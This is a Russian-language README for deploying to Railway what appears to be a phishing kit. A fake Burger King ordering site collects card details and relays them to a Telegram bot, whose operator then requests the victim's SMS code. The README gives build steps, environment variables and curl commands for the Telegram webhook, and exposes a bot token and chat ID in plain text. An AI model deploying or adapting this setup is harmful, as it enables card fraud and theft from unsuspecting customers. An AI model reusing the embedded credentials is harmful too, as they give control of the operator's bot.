# 🚀 Развертывание на Railway

## Быстрая настройка

### 1. Подготовка проекта
```bash
# Сборка frontend
npm run build:frontend

# Проверка что все работает
npm run start
```

### 2. Развертывание на Railway

1. **Перейдите на [Railway.app](https://railway.app)**
2. **Войдите через GitHub**
3. **Создайте новый проект:**
   - Нажмите "New Project"
   - Выберите "Deploy from GitHub repo"
   - Выберите ваш репозиторий

4. **Railway автоматически:**
   - Определит Node.js проект
   - Установит зависимости
   - Запустит `npm run start`

### 3. Настройка переменных окружения

В Railway Dashboard добавьте переменные:
- `BOT_TOKEN`: `8406857793:AAGDQnLYrL78nWDrBxi1AS1kWTTVjxdUbpg`
- `CHAT_ID`: `-1003171719602`

### 4. Получение URL

После развертывания Railway даст вам URL типа:
`https://your-app-name.railway.app`

### 5. Установка webhook

```bash
# Замените YOUR_URL на ваш Railway URL
curl -X POST "https://api.telegram.org/bot8406857793:AAGDQnLYrL78nWDrBxi1AS1kWTTVjxdUbpg/setWebhook" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://your-app-name.railway.app/webhook"}'
```

### 6. Проверка webhook

```bash
curl "https://api.telegram.org/bot8406857793:AAGDQnLYrL78nWDrBxi1AS1kWTTVjxdUbpg/getWebhookInfo"
```

## Структура проекта

```
├── src/                    # Frontend React код
├── dist/                   # Собранный frontend (создается после build)
├── webhook-server.cjs      # Backend сервер с webhook
├── package.json            # Зависимости и скрипты
├── railway.json           # Конфигурация Railway
├── Procfile               # Команда запуска
└── vite.config.js         # Конфигурация Vite
```

## Что работает

✅ **Frontend** - React приложение Burger King  
✅ **Backend** - Express сервер с webhook  
✅ **Telegram Bot** - Получение обновлений  
✅ **SMS API** - Проверка флагов  
✅ **Static Files** - Обслуживание frontend  

## Тестирование

1. **Откройте ваш Railway URL**
2. **Оформите заказ**
3. **Введите данные карты**
4. **Нажмите "Pay Now"**
5. **В Telegram нажмите "Запросить SMS"**
6. **Проверьте переход на SMS страницу**

## Устранение проблем

- **Сайт не загружается**: Проверьте что `npm run build:frontend` выполнен
- **Webhook не работает**: Проверьте URL в Telegram
- **SMS не запрашивается**: Проверьте переменные окружения
